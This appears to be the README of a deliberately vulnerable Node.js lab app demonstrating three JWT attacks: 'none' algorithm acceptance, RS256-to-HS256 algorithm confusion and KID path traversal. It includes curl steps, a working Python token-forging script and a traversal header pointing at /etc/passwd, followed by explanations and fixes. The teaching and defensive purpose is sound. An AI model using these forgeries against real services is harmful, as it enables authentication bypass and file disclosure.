# JWT Vulnerabilities Demo

This is a simple Node.js application that demonstrates three common JWT vulnerabilities:
1. The "none" algorithm vulnerability
2. The RS256 to HS256 algorithm confusion vulnerability
3. The JWT KID parameter injection vulnerability

This application is intentionally vulnerable for educational purposes only.

## Setup

1. Generate RSA keys:
```bash
node generate-keys.js
```

2. Install dependencies:
```bash
npm install
```

3. Start the server:
```bash
npm start
```

## Available Endpoints

### Public Key
- `GET /public.pem` - Returns the public key used for RS256 verification

### Authentication
- `POST /login` - Login with username/password (HS256)
- `POST /rs256-login` - Login with username/password (RS256)
- `POST /kid-login` - Login with username/password (KID)

### Protected Routes
- `GET /protected` - Protected route (vulnerable to "none" algorithm)
- `GET /rs256-protected` - Protected route (vulnerable to algorithm confusion)
- `GET /kid-protected` - Protected route (vulnerable to KID injection)

## Testing the Vulnerabilities

### 1. "none" Algorithm Vulnerability

#### Get a Valid Token
First, get a valid JWT token by logging in:
```bash
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'
```

#### Exploit the Vulnerability
1. Take the JWT token received from the login endpoint
2. Decode it using a JWT decoder
3. Modify the header to use the "none" algorithm
4. Remove the signature
5. Send the modified token to the protected endpoint

Example of a modified JWT header:
```json
{
  "alg": "none",
  "typ": "JWT"
}
```

Send the modified token to the protected endpoint:
```bash
curl http://localhost:3000/protected \
  -H "Authorization: Bearer <modified-token>"
```

### 2. RS256 to HS256 Algorithm Confusion

#### Get the Public Key
First, download the public key:
```bash
curl http://localhost:3000/public.pem -o public.pem
```

#### Get a Valid RS256 Token
Get a valid RS256 JWT token:
```bash
curl -X POST http://localhost:3000/rs256-login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'
```

#### Exploit the Vulnerability
1. Take the RS256 token received from the login endpoint
2. Decode it using a JWT decoder
3. Modify the header to use the HS256 algorithm
4. Sign the token using the public key as the HMAC secret
5. Send the modified token to the protected endpoint

Example Python code to generate the attack:
```python
import base64
import hashlib
import hmac

f = open("public.pem")
key = f.read()
# RS => HS, login -> admin
str = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6ImFkbWluIn0"

sig = base64.urlsafe_b64encode(hmac.new(key.encode(), str.encode(), hashlib.sha256).digest()).decode('utf-8').rstrip("=")

print(str+"."+sig)
```

Send the modified token to the protected endpoint:
```bash
curl http://localhost:3000/rs256-protected \
  -H "Authorization: Bearer <modified-token>"
```

### 3. JWT KID Parameter Injection

#### Get a Valid KID Token
First, get a valid JWT token with KID:
```bash
curl -X POST http://localhost:3000/kid-login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}'
```

#### Exploit the Vulnerability
1. Take the token received from the login endpoint
2. Decode it using a JWT decoder
3. Modify the KID parameter in the header to point to a malicious file
4. Resign the token with the key from the malicious file
5. Send the modified token to the protected endpoint

Example of a modified JWT header:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../etc/passwd"
}
```

Send the modified token to the protected endpoint:
```bash
curl http://localhost:3000/kid-protected \
  -H "Authorization: Bearer <modified-token>"
```

## Security Implications

### "none" Algorithm Vulnerability
This vulnerability occurs because:
1. The application accepts tokens with the "none" algorithm
2. The verification process doesn't properly validate the algorithm
3. Tokens without a signature are accepted

### RS256 to HS256 Algorithm Confusion
This vulnerability occurs because:
1. The application accepts both RS256 and HS256 algorithms
2. The public key is used as the HMAC secret
3. The verification process doesn't properly validate the algorithm

### JWT KID Parameter Injection
This vulnerability occurs because:
1. The KID parameter is not properly sanitized
2. The application allows directory traversal in the KID parameter
3. The key file path is constructed without proper validation

## How to Fix

### "none" Algorithm Fix
To fix this vulnerability:
1. Always specify the exact algorithm to use during verification
2. Never accept tokens with the "none" algorithm
3. Always verify the signature

Example of secure verification:
```javascript
jwt.verify(token, SECRET_KEY, { algorithms: ['HS256'] });
```

### RS256 to HS256 Algorithm Confusion Fix
To fix this vulnerability:
1. Always specify the exact algorithm to use during verification
2. Never accept HS256 when expecting RS256
3. Use different keys for signing and verification

Example of secure verification:
```javascript
jwt.verify(token, publicKey, { algorithms: ['RS256'] });
```

### JWT KID Parameter Injection Fix
To fix this vulnerability:
1. Sanitize the KID parameter to prevent directory traversal
2. Use a whitelist of allowed KID values
3. Validate the key file path before reading

Example of secure KID handling:
```javascript
const allowedKids = ['key1', 'key2', 'key3'];
if (!allowedKids.includes(decodedHeader.kid)) {
    return res.status(401).json({ message: 'Invalid KID' });
}
const keyPath = path.join(KEYS_DIR, decodedHeader.kid);
``` 